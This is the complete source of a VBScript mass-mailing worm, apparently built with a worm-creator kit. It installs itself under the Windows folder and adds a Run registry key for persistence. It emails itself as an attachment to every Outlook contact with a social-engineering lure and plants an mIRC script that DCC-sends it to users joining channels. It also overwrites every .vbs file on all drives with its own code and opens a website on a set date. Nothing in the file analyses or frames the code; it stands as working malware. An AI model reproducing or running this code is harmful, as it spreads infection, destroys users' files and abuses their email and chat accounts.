'This file Has been created whit the Vbs Worms Creator 0.8
'EMM Created By PetiK
On Error Resume Next
Set nbmszqzsuhb = CreateObject("WScript.Shell")
Set ecwgcxejaau= Createobject("scripting.filesystemobject")
ecwgcxejaau.copyfile wscript.scriptfullname,ecwgcxejaau.GetSpecialFolder(0)& "\emm.dll.vbs"
nbmszqzsuhb.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\emm.dll","wscript.exe "&ecwgcxejaau.GetSpecialFolder(0)& "\emm.dll.vbs %"
if nbmszqzsuhb.regread ("HKCU\software\EMM\mailed") <> "1" then
zwgepanqouv()
end if
if nbmszqzsuhb.regread ("HKCU\software\EMM\mirqued") <> "1" then
dnotyvksblv()
end if
snchhgjbybr()
xxfhieqyumd()
Function zwgepanqouv()
On Error Resume Next
Set epdfmrcjcvj = CreateObject("Outlook.Application")
If epdfmrcjcvj= "Outlook"Then
Set utiyhacpcif=epdfmrcjcvj.GetNameSpace("MAPI")
For Each omyjvrpvdlv In utiyhacpcif.AddressLists
If omyjvrpvdlv.AddressEntries.Count <> 0 Then
For pugdstjnpuo= 1 To omyjvrpvdlv.AddressEntries.Count
Set ejjilwadszy = omyjvrpvdlv.AddressEntries(pugdstjnpuo)
Set gikgsawofgq = epdfmrcjcvj.CreateItem(0)
gikgsawofgq.To = ejjilwadszy.Address
gikgsawofgq.Subject = "Here you have, ;o)"
gikgsawofgq.Body = "Hi:" & vbcrlf & "Check This!" & vbcrlf & ""
gikgsawofgq.Attachments.Add ecwgcxejaau.GetSpecialFolder(0)& "\emm.dll.vbs"
gikgsawofgq.DeleteAfterSubmit = True
If gikgsawofgq.To <> "" Then
gikgsawofgq.Send
nbmszqzsuhb.regwrite "HKCU\software\EMM\mailed", "1"
End If
Next
End If
Next
end if
End Function
Function dnotyvksblv(fhomekxxlpv)
On Error Resume Next
if fhomekxxlpv<>"" then
if ecwgcxejaau.fileexists("c:\mirc\mirc.ini") then fhomekxxlpv="c:\mirc"
if ecwgcxejaau.fileexists("c:\mirc32\mirc.ini") then fhomekxxlpv="c:\mirc32"
jtjverejgqh=nbmszqzsuhb.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if ecwgcxejaau.fileexists(jtjverejgqh & "\mirc.ini") then fhomekxxlpv=jtjverejgqh & "\mirc"
end if
if fhomekxxlpv <> "" then
set tkqtrxfmqrw = ecwgcxejaau.CreateTextFile(fhomekxxlpv & "\script.ini", True)
tkqtrxfmqrw.WriteLine "[script]"
tkqtrxfmqrw.writeline "n0=on 1:JOIN:#:{"
tkqtrxfmqrw.writeline "n1=  /if ( $nick == $me ) { halt }"
tkqtrxfmqrw.writeline "n2=  /.dcc send $nick "&ecwgcxejaau.GetSpecialFolder(0)& "\emm.dll.vbs"
tkqtrxfmqrw.writeline "n3=}"
tkqtrxfmqrw.close
nbmszqzsuhb.regwrite "HKCU\software\EMM\Mirqued", "1"
end if
end function
if month(now) =1 and day(now) =26 then
nbmszqzsuhb.run "Http://www.virii.com.ar",3,false
end if
Function xxfhieqyumd()
On Error Resume Next
Set ifuvloycwmk = ecwgcxejaau.Drives
For Each kjmeiluhhpk In ifuvloycwmk
If kjmeiluhhpk.Drivetype = Remote Then
lhtixwnhsni= kjmeiluhhpk & "\"
Call pummfftxdrb(lhtixwnhsni)
ElseIf kjmeiluhhpk.IsReady Then
lhtixwnhsni= kjmeiluhhpk&"\"
Call pummfftxdrb(lhtixwnhsni)
End If
Next
End Function
Function pummfftxdrb(rdmsmlirpbt)
Set ybzfnozzeqg= ecwgcxejaau.GetFolder(rdmsmlirpbt)
Set vdtwgkfvsss= ybzfnozzeqg.Files
For Each unjncpiqstp In vdtwgkfvsss
if ecwgcxejaau.GetExtensionName(unjncpiqstp.path) = "vbs" then
ecwgcxejaau.copyfile wscript.scriptfullname , unjncpiqstp.path , true
end if
if unjncpiqstp.name = "mirc.ini" then
dnotyvksblv(unjncpiqstp.ParentFolder)
end if
Next
Set unjncpiqstp= ybzfnozzeqg.SubFolders
For Each cqfyvqavqxd In unjncpiqstp
Call pummfftxdrb(cqfyvqavqxd.path)
Next
End Function
